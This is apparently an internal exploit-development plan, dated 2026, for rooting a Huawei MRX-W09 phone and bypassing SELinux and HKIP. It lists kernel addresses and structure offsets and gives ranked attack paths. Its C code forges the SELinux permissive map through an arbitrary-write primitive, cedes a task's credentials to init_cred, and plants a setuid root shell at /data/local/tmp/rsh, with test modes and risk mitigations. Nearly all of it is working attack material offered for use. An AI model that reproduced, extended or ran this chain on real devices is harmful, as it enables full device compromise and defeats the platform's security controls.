# GhostLock / MRX-W09 — ENDGAME STRATEGY (ranked) — 2026-09-25

Target: MRX-W09, Kirin 990, Linux 4.14.116, EMUI 11, SELinux enforcing + HKIP/HHEE.
Goal: as **uid 0** with an HKIP bit **and a SELinux context that may write `shell_data_file`**,
create `/data/local/tmp/rooted.txt` and a 4755 root-owned `/data/local/tmp/rsh`; verify
`/data/local/tmp/rsh -c id` → `uid=0`.

Proven primitives (do not re-litigate): arbitrary 8-byte VALUE write `*(target)=value` (value must
point at an odd word; side store at `(value&~3)+8/+0x10`); LEAF zero write; boot_id 16-byte read;
re-armable multi-walk; the **both-slot cede** `Ts+0x9E0/Ts+0x9E8 = &init_cred` (lands attempt 0)
followed by a shielded fork giving a child that is **uid 0 + full caps + KERNEL sid + its own HKIP
bit** (`copy_process→hkip_init_task`). All syscall SELinux routes are measured closed
(enforce/attr/exec/execve/mount/setcon sweep = EACCES) and `cred->security` reads are destructive.

---

## 0. The one new fact that unlocks the endgame

Huawei **compile-folded `selinux_enforcing` to constant 1**, so `avc_denied()` reduces to:

```c
/* security/selinux/avc.c:1007 (selinux_enforcing == 1 at compile time on MRX-W09) */
if (selinux_enforcing && !(avd->flags & AVD_FLAGS_PERMISSIVE))  // -> !(avd->flags & 1)
    return -EACCES;
... avc_update_node(AVC_CALLBACK_GRANT,...); return 0;             // permissive -> GRANT
```

Measured disasm (`ghostlock_pocs/SELINUX_PATH_RECON_20260924.md:41-46`,
`STATIC_TASKS_SYNTHESIS_20260924.md:17-25`): `avc_denied` reads **no enforcing global** — it only
tests `AVC_STRICT` and bit 0 of `*(avd+0x10)`. `struct av_decision` = `{u32 allowed@0;
auditallow@4; auditdeny@8; seqno@0xC; u32 flags@0x10;}` and `AVD_FLAGS_PERMISSIVE = 0x0001`
(`include/security.h:119-151`). So **the permissive bit alone is sufficient to turn every denial
into a grant**; there is no second enforcing gate to defeat.

`security_compute_av()` sets that bit from the policy's permissive map **for the SOURCE type**:

```c
/* ss/services.c:1119-1120 (and 1165-1166 for the _user variant) */
if (ebitmap_get_bit(&policydb.permissive_map, scontext->type))
    avd->flags |= AVD_FLAGS_PERMISSIVE;
```

`policydb` is ordinary global storage (`0xffffff800b3b97c0`), and **the `permissive_map` HEADER is
writable even though its bitmap nodes are prmem-protected** (report 023 R-12/R-13). So we can
repoint `permissive_map.node` at a **fake `ebitmap_node` we build in the stamped arm window**, set
`highbit` large, and make every source type permissive — no SID search, no `cred->security` write,
no destructive read. This reuses the already-proven cede/fork child unchanged.

### ebitmap geometry (verified from source)
`security/selinux/ss/ebitmap.h:22-46`:
```
EBITMAP_NODE_SIZE = 64
sizeof(void*)=8, sizeof(u32)=4
EBITMAP_UNIT_NUMS = (64-8-4)/8 = 6
EBITMAP_UNIT_SIZE = 64
EBITMAP_SIZE      = 6*64 = 384
struct ebitmap_node { struct ebitmap_node *next; unsigned long maps[6]; u32 startbit; } // startbit@0x38
struct ebitmap      { struct ebitmap_node *node; u32 highbit; bool protectable; }        // node@+0x00, highbit@+0x08
```
`ss/ebitmap.c:261-276`:
```c
if (e->highbit < bit) return 0;
n = e->node;
while (n && (n->startbit <= bit)) {
    if ((n->startbit + EBITMAP_SIZE) > bit) return ebitmap_node_get_bit(n, bit);
    n = n->next;
}
return 0;
```
`ebitmap_node_get_bit` reads only `maps[(bit-startbit)/64]`.

**Answer to the question posed:** a type value `< EBITMAP_SIZE (384)` with a fake node
`{next=odd, maps[0..5]=~0, startbit=0}` and `highbit >= type` makes `ebitmap_get_bit` return 1.
`startbit=0` covers types 0..383 in maps[0..5]; making **all** small types permissive is exactly
`maps[0..5] = ~0`. Types `>= 384` must be terminated safely (see §2) because the loop would follow
`next`; a sentinel node with `startbit=0xFFFFFFFF` handles them.

Addresses (link-time, add `g_slide`):
`policydb = 0xffffff800b3b97c0`; `permissive_map.node = policydb+0x308`;
`permissive_map.highbit = policydb+0x310`.

---

## 1. RANKED PATHS

### PATH 1 (TOP) — Permissive-map forgery + the proven cede child
**Idea.** Install a fake permissive map, then let the already-correct `[uid 0 + KERNEL sid + own bit]`
task create/exec the deliverables. The permissive bit is the *only* remaining gate, so this
converts the proven root state into a writable root state.

Components / exact shapes:
| Piece | Symbol / address | Shape |
|---|---|---|
| source of truth | `avc_denied` | needs `avd->flags` bit0 only (services.c:1119, avc.c:1007) |
| header node | `policydb+0x308` | VALUE write, value = N (fake node addr) |
| header highbit | `policydb+0x310` | VALUE write, value = `g_blackval` |
| fake node N | `W - 0x78 + 0xC8` (arm window) | built in `g_sbuf` (free-form bytes) |
| cede | `Ts+0x9E0 = Ts+0x9E8 = &init_cred` | proven (`0xffffff800adfcd28+g_slide`) |
| shield | leaf-zero `Ts+0x820` | proven |

Node contents (built in `g_sbuf`, so no INT-write limitation applies):
```
N+0x00 (next)      = (window_base+0x00) | 1   // odd => VALUE write accepted; sentinel ptr
N+0x08 (maps[0])   = ~0ULL                    // types 0..63
N+0x10 (maps[1])   = W                        // see "side-store steering" below
N+0x18..N+0x30     = ~0ULL                    // types 128..383
N+0x38 (startbit)  = 0
sentinel @ window_base+0x00: startbit(+0x38) = 0xFFFFFFFF   // terminates type>=384 safely
```
**Side-store steering (the key to not corrupting `maps[0]`).** The erase's W2 store writes
`child (=target)` into `*(parent+0x8)` unless `*(parent+0x10) == erased_node`, in which case it
writes `*(parent+0x10)` (`ERASE_SHAPES §1.3`, `FACTS 9r`), where `parent = value&~3 = N` and
`erased_node = W`. Setting `N+0x10 = W` therefore diverts the side store to `maps[1]`; `maps[0]`
and `maps[2..5]` survive. (The clobbered `maps[1]` becomes `policydb+0x308`, whose set bits are
fixed but harmless.) Do the **highbit write first with `value = g_blackval`** (side store lands in
the window, not the node), then the **node write** (`value = N`, side store → `maps[1]`).
`maps[1]` covers types 64..127; if the source type happens to be there, re-stamp with
`startbit = 64` (then 128/192/256/320) — six values cover every type 0..383 deterministically
because `type` falls in `maps[0]` for exactly one choice of `startbit = 64*floor(type/64)`.

On-device steps:
1. Enablers first, exactly like `--pid0win`: leaf-zero `panic_on_oops` (`0xffffff800adf45a0`) and
   `kptr_restrict` (`0xffffff800adea9e0`).
2. **Cheap oracle (no cede, MAIN only):** install permissive map, then `capset(NULL all-zero)`
   (syscall 90). Baseline on shell = `-1/EPERM` (`FACTS §4`, report 026 R-03). If it returns 0,
   the permissive forgery works. Iterate `startbit ∈ {0,64,128,192,256,320}` until it does.
3. Full endgame: leak consumer `Ts`, shield `Ts+0x820`, both-slot cede to `&init_cred`
   (or fork the shielded consumer, as already proven), install the permissive map, then have the
   ceded task `open("/data/local/tmp/rooted.txt",O_CREAT|O_WRONLY,0644)`,
   `cp /system/bin/sh → rsh`, `chmod(04755)`, and `execve(rsh, ["rsh","-c","id"])`.

Expected confirming log lines:
```
[*] perm: policydb=0xffffff800b3b97c0 slide=...
[*] perm: node N=0xfffffff2cb6844a0 maps0=ffffffffffffffff startbit=0 highbit=cb6844a0
[+] perm: capset rc=0 (was -1/EPERM)   <-- PERMISSIVE CONFIRMED
fl2: cede it=0 done=1
fl2: rooted fd=7
fl2: rsh chmod=0
rsh -c id -> uid=0(root) gid=0(root) context=u:r:shell:s0
```
and on failure the absence of `avc: denied { create } ... scontext=u:r:kernel:s0` in `logcat -b all`.
Residual unknowns / cheap falsification: (a) `permissive_map` offset +0x308 — one `objdump` of
`security_compute_av` (`services.c:1119`) reading the ADRP/ADD immediate decides it; (b) whether
`policydb` is truly writable (prmem) — the highbit write either lands or panics; do it under
`panic_on_oops=0`; (c) AVC cache ordering — see Risk 2; (d) window persistence — see Risk 1.

### PATH 2 — Fake `task_security_struct` in the window + `cred->security` swap
Point a private cred's `security` at a window blob with `sid = shell NUMBER`; launder via a
fork so the tsec is kmemdup'd (`FACTS 9an(50-54)`). **Blocked/expensive:** the shell SID NUMBER is
not exposed by any userspace node (`/sys/fs/selinux/context` returns the string only; `FACTS
9an(46)/(47)`), and a 1..600 brute force was all-EACCES (`9an(54)/(56)`). It also still needs the
`policydb`-free window to persist. Only worth it if Path 1's `policydb` write is impossible. Cheap
falsification: same window-node persistence test as Path 1.

### PATH 3 — Policy-rule injection (`te_avtab` / `ocontexts` / `type_val_to_struct`)
Writable `struct avtab te_avtab/te_cond_avtab` headers and the `*_val_to_struct` pointer arrays
(`policydb.h:263-286`, report 023 R-14/R-15) let us redirect lookups or forge allow rules. Strictly
more complex than the one-bit permissive flip and depends on the same `policydb` writability.
Keep as a fallback if the permissive header is in fact protected.

### PATH 4 — sidtab node context rewrite
`sidtab` nodes are ordinary `kmalloc`, not prmem (`sidtab.c:18-30`, report 023 R-26/R-27); rewriting
our SID's `context.type` to an allowed type would work. Needs the sidtab node address, which we
cannot read (aligned-pointer reads cold-bail; `FACTS 9an(8)`). Low.

### PATH 5 — AVC-node poisoning
Only affects already-cached tuples and needs the heap node address (`FACTS §9b`, report 023 R-38).
Great as a *cache-invalidation* patch (Risk 2) but not as a primary route. Low.

### PATH 6 — UMH via forged `work_struct` (`call_usermodehelper_exec_work`)
HKIP-clean but requires full arbitrary RW to build/splice a work item and bootstrap
(`ENDGAME_TECHNIQUES §6`). Blocked on RW; revisit only if Path 1/3 give a write primitive extension.

### PATH 7 — `cred->security := *(init_cred+0x78)` (real tsec swap)
Blocked: reading `P+0x78` is destructive (`FACTS 9an(37)`), and it would still yield KERNEL sid
(which cannot write `shell_data_file`). Dead unless combined with Path 1.

---

## 2. IMPLEMENTATION SPEC — the exact next single code change (`--perm` in `ghostlock_mrx_e.c`)

Add one mode and one function; touch `build_v2()` only additively.

**Constants (near line 42):**
```c
#define LINK_POLICYDB        UINT64_C(0xffffff800b3b97c0)
#define POLICYDB_PERM_NODE   0x308u
#define POLICYDB_PERM_HIGH   0x310u
static int  g_permmode = 0;
static int  g_perm_startbit = 0;                 /* swept 0,64,...,320 */
static uint64_t g_perm_node = 0;                 /* N, computed at stamp time */
```

**`build_v2(value,target,W)` (line 376)** — when `g_permmode`:
- put the **sentinel** at `window_base = W - g_w_off` (buffer 0x00): set `*(u32*)(g_sbuf+0x38)=0xFFFFFFFF`.
- put the **fake node** at `g_permnode_off = 0xC8` (deep half; buffer 0xC8..0x107):
```c
uint64_t base = W - (uint64_t)g_w_off;
g_perm_node   = base + 0xC8;
*(uint64_t*)(g_sbuf+0xC8)      = (base + 0x00) | 1;      /* next: odd, sentinel */
for (int i=0;i<6;i++)
    *(uint64_t*)(g_sbuf+0xD0+8*i) = ~UINT64_C(0);        /* maps[0..5] all-ones */
*(uint64_t*)(g_sbuf+0xD0)      = ~UINT64_C(0);           /* maps[0] (re-assert) */
*(uint64_t*)(g_sbuf+0xD8)      = W;                      /* maps[1]=W -> side-store steer */
*(uint32_t*)(g_sbuf+0x38+0xC8) = (uint32_t)g_perm_startbit; /* startbit */
```
- restrict the `ks[]` blackval list to `{0x18,0x20,0x28,0x30,0x38,0x40}` so `g_blackval` lives in
  0x18..0x40, away from the node; skip the old 0xC8..0x100 entries.
- skip the `g_sidmode` fake tsec (not needed for this path).

**New function:**
```c
static int install_permissive(void){
    uint64_t PD = LINK_POLICYDB + g_slide;
    uint64_t N  = g_perm_node;
    /* value must point at a readable odd word; g_blackval slot == 1, neighbour also 1 */
    int a = do_write(g_blackval, PD + POLICYDB_PERM_HIGH);   /* highbit := g_blackval.low32 */
    int b = do_write(N,          PD + POLICYDB_PERM_NODE);   /* node    := N (side store -> maps[1]) */
    return (a==0 && b==0);   /* do_write returns its walk result; retry inside do_write's loop */
}
```
Notes: run both writes with `g_quietprim=1`, `g_nofile=1`, `g_nowait=1` (no post-cred file I/O,
no `pthread_join`, no `/proc` witness — reports W1/W2/W3). `do_write` already retries the walk
internally; a "cold" walk returns without a store, so loop `install_permissive()` until the
`capset` oracle flips.

**`--permtest` mode (MAIN only, no cede):**
```
for (sb in {0,64,128,192,256,320}) {
    g_perm_startbit = sb;
    build_v2(g_blackval, PD+POLICYDB_PERM_HIGH, g_waiter_abs);   /* stamp once, keep window live */
    install_permissive();
    r = capset(NULL, all-zero sets);                            /* syscall 90, header.pid=getuid() */
    log("perm: sb=%d capset rc=%d", sb, r);
    if (r == 0) break;
}
```
`sweep/probe to run`: `ghostlock_e --permtest`. Baseline (no writes) prints
`capset rc=-1 errno=1`; success prints `capset rc=0`. Then wire `install_permissive()` into `--fl2`
immediately **after** the both-slot cede and **before** any kernel-SID file operation, signal the
ceded task over the existing pipe, and let it call `write_proof()`.

**AVC-cache ordering is mandatory:** install the permissive map *before* the first kernel-SID
create/exec. `avc_node_populate()` (`avc.c:585-591`) `memcpy`s `avd` (including `flags=0`) into the
cache, and a cache hit reuses that avd (`avc.c:1130-1134`); a denial cached earlier would ignore the
new permissive map. A fresh boot per run clears the cache; do not run the old `rootfile` probe first.

---

## 3. TOP 3 RISKS + cheapest reduction

1. **Window lifetime / stamp reliability (dominant).** The fake node lives in the MCAST-stamped
   kernel stack; an IRQ/tick frame or any syscall on that thread can overwrite buffer 0xC8 before
   the AVC reads it. Reduce: (a) place the node in the deep half (0xC8..0x107, the region proven to
   survive `w[7]`), (b) after the last header write, keep the stamper **spinning in user space**
   (`FACTS 9ac --trigfirst` proved the window is read byte-for-byte when no syscall follows), and
   (c) do the `capset`/create within microseconds of the final stamp. Cheapest falsifier: run
   `--mcastcal`-style canary in the 0xC8 slot and confirm the walk reads `0xdead…` there before
   trusting the node.

2. **AVC cache holds a pre-existing denial with `flags=0`.** Then `security_compute_av` (and thus
   our permissive bit) is never consulted for that tuple. Reduce: install permissive *before* any
   kernel-SID create/exec; use a fresh boot; if a denial is already cached, either evict via
   `avc_cache_threshold`/`avc_reclaim_node` (`avc.c:89-90`, report 023 R-43) or patch the specific
   `avc_node.ae.avd.flags` (needs the node address — hard). Cheapest falsifier: the `--permtest`
   `capset` oracle is chosen because `capset` is almost never called before, so its tuple is uncached.

3. **`policydb.permissive_map` offset / `policydb` writability (prmem).** +0x308 is from static
   analysis; if `policydb` or the header is protected, the write faults. Reduce: (a) verify the
   offset by disassembling `security_compute_av` (the `services.c:1119` load) and (b) do the first
   write under `panic_on_oops=0` and with the node pointing at a real readable window address, so a
   fault kills only the faulting task. Cheapest falsifier: the `--permtest` `capset` flip; if it
   never flips on any `startbit` while the canary confirms the node landed, the header is protected.

Secondary risks worth stating: `panic_on_oops` must be 0 before any policydb experiment; the
pid-0 shield makes `do_exit` fatal (never restore `Ts+0x820` and never let a pid-0-cached task
exit); and the setup is ~1-in-4 panic-prone (`FACTS 9an(61)(69)(70)`), so run on a healthy device
and retry rather than changing code.

---

## 4. Why Path 1 is the correct next move (one-paragraph synthesis)

Everything needed for root is already proven on-device; the *only* missing property is SELinux
permission to write `shell_data_file`. All syscall ways to change the context are measured EACCES,
and all memory ways to change `cred->security` require either a small-integer write or a
destructive pointer read the primitive cannot do. The permissive map is the one lever reachable
with exactly the primitive we have (an 8-byte pointer write), it acts on `avc_denied` directly
(Huawei deleted the enforcing global, leaving the permissive bit as the sole gate), and it composes
with the already-working `[uid 0 + KERNEL sid + own HKIP bit]` cede/fork state. The `--permtest`
`capset` oracle makes it falsifiable with a single MAIN-only run, without paying the cede/setup
lottery.
